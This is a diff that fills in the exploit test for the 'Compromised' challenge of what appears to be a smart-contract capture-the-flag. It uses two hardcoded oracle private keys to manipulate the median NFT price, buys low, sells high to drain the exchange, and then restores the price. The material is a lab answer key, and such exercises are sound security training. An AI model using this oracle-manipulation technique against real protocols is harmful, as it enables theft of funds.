@@ -61,6 +61,37 @@ describe('Compromised challenge', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+        const pkey1 = "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9";
+        const pkey2 = "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48";
+
+        const oracle1 = new ethers.Wallet(pkey1, ethers.provider);
+        const oracle2 = new ethers.Wallet(pkey2, ethers.provider);
+
+        const oracle1Connect = this.oracle.connect(oracle1);
+        const oracle2Connect = this.oracle.connect(oracle2);
+
+        const setMedianPrice = async (amount) => {
+
+            await oracle1Connect.postPrice("DVNFT", amount);
+
+            await oracle2Connect.postPrice("DVNFT", amount);
+
+            let currentMedianPrice =  await this.oracle.getMedianPrice("DVNFT");
+            console.log("New median price is: " , currentMedianPrice.toString());
+        }
+
+        let price = ethers.utils.parseEther("0.01");
+        await setMedianPrice(price);
+        const attackExchange = this.exchange.connect(attacker);
+        const attackNFT = this.nftToken.connect(attacker);
+
+        await attackExchange.buyOne({value: price});
+        price = await ethers.provider.getBalance(this.exchange.address);
+        await setMedianPrice(price);
+        await attackNFT.approve(attackExchange.address, 0);
+        await attackExchange.sellOne(0);
+
+        await setMedianPrice(INITIAL_NFT_PRICE);
     });
 
     after(async function () {
